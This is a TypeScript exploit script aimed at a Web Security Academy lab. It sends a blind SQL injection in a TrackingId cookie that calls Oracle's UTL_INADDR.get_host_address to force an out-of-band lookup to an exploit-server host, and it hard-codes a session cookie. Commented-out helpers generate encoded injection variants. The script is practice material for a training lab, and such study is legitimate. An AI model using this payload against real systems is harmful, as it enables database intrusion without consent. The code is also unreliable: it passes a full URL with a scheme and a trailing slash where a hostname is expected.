import axios from "axios";

const subDomain = "0a0f006903b52a7fc051684c00c500e1";
const fullWebAddress = `https://${subDomain}.web-security-academy.net/`;
const burpSubdomain = `https://exploit-0a5f00e0032e660fc0b9086c01c300e6.web-security-academy.net/`;
const burpExploitServerURL = `https://${burpSubdomain}.web-security-academy.net/`;

const initiateOutOfBandInteraction = async () => {
  try {
    const hijackedCookie = `session=XlLpSacUPG6Y17k31ymsZ6YLXoCbXHFO; TrackingId=uat88Mgxf1kMsD8C'%3BSELECT UTL_INADDR.get_host_address('${burpSubdomain}')`;
    const response = await axios.get(fullWebAddress, {
      headers: { Cookie: hijackedCookie },
    });
    console.log(response);
  } catch (e) {
    console.log("ERROR!", e);
  }
};

// const generateSQLInjectionVariations = (
//   prefix: string,
//   originalVariation: string
// ): string[] => {
//   const variations = [];
//   variations.push(prefix + originalVariation);
//   const uriEncodedSQLInjection = encodeURIComponent(prefix + originalVariation);
//   variations.push(uriEncodedSQLInjection);
//   // encode only the concatenation
//   return variations;
// };

// const determineDatabaseBrand = async (): Promise<DatabaseBrand> => {
//   return DatabaseBrand.ORACLE;
// };

const enum DatabaseBrand {
  ORACLE = "ORACLE",
  POSTGRESQL = "POSTGRESQL",
  MYSQL = "MYSQL",
  MICROSOFTDB = "MICROSOFTDB",
}

initiateOutOfBandInteraction();

// Attack Strategy

// Determine database type
// Initiate server on Burp Collaborator
//
